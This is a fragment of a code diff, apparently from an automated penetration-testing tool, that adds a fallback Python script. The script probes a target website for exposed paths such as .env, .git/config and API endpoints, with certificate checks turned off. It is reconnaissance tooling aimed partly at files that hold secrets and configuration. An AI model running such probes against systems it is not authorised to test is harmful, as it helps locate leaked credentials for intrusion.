+                "script": f"import urllib.request, ssl\nctx=ssl._create_unverified_context()\ntarget='{target}'\npaths=['.env','.git/config','robots.txt','sitemap.xml','api/v1','graphql']\nprint('=== Python Path Scanner ===')\nfor p in paths:\n    try:\n        r=urllib.request.urlopen(f'https://{{target}}/{{p}}', context=ctx, timeout=10)\n        print(f'[{{r.status}}] /{{p}}')\n    except urllib.error.HTTPError as e:\n        if e.code != 404: print(f'[{{e.code}}] /{{p}}')\n    except: pass",
+                "phase": phase, "expected_outcome": "Discover accessible web paths."
+            }
         ]
         # Rotate through options sequentially to avoid duplicates
         choice = fallback_options[self._fallback_index % len(fallback_options)]
